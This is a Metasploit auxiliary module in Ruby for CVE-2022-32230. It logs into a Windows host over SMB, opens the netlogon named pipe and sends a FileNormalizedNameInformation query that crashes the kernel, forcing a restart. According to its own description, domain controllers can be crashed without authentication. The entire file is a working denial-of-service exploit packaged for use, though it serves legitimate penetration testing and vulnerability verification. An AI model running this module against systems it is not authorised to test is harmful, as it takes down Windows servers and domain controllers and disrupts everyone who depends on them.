##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::SMB::Client::Authenticated

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'SMBv3 FileNormalizedNameInformation NULL-ptr Dereference',
        'Description' => %q{
          A remote and unauthenticated attacker can trigger a denial of service condition on Microsoft Windows Domain
          Controllers by leveraging a flaw that leads to a null pointer deference within the Windows kernel. The same
          vulnerability can be triggered on systems that are not Domain Controllers when authenticated. The
          vulnerability is triggered by opening a named pipe and then querying it for FileNormalizedNameInformation.
          Access to a named pipe is why domain controllers can exploited anonymously while other systems require
          authentication. This vulnerability was patched in April 2022.
        },
        'Author' => [ 'Spencer McIntyre' ],
        'License' => MSF_LICENSE,
        'Actions' => [
          ['DOS', { 'Description' => 'Trigger Denial of Service against target' }],
        ],
        'DefaultAction' => 'DOS',
        'References' => [
          [ 'CVE', '2022-32230' ],
        ],
        'DisclosureDate' => '2022-06-14',
        'Notes' => {
          'Stability' => [ CRASH_OS_RESTARTS ],
          'SideEffects' => [ SCREEN_EFFECTS ], # the BSOD is visible on the screen
          'Reliability' => [] # the DoS is reliable, but no payload is executed
        }
      )
    )

    register_options([ OptString.new('SMBPIPE', [ true, 'The pipe name to use', 'netlogon']) ])
    register_options([ Opt::RPORT(445) ])
  end

  def run
    connect
    begin
      smb_login
    rescue Rex::Proto::SMB::Exceptions::Error, RubySMB::Error::RubySMBError => e
      fail_with(Module::Failure::NoAccess, "Unable to authenticate ([#{e.class}] #{e}).")
    end

    begin
      @tree = simple.client.tree_connect("\\\\#{sock.peerhost}\\IPC$")
    rescue RubySMB::Error::RubySMBError => e
      fail_with(Module::Failure::Unreachable,
                "Unable to connect to the remote IPC$ share ([#{e.class}] #{e}).")
    end

    query_file(filename: datastore['SMBPIPE'])
  end

  def query_file(filename: nil, type: RubySMB::Fscc::FileInformation::FileNormalizedNameInformation)
    begin
      file_id = @tree.open_file(filename: filename).guid
    rescue RubySMB::Error::RubySMBError => e
      fail_with(Module::Failure::Unreachable,
                "Unable to open the specified named pipe ([#{e.class}] #{e}).")
    end

    query_request = RubySMB::SMB2::Packet::QueryInfoRequest.new
    query_request.info_type = RubySMB::SMB2::SMB2_INFO_FILE
    query_request.file_information_class = type::CLASS_LEVEL
    query_request.file_id = file_id
    query_request.output_buffer_length = 0x400
    query_request = @tree.set_header_fields(query_request)

    begin
      @tree.client.send_recv(query_request, encrypt: @tree.tree_connect_encrypt_data)
    rescue RubySMB::Error::CommunicationError
      vprint_status('Received a communication error which indicates the service has crashed')
    end
  end
end
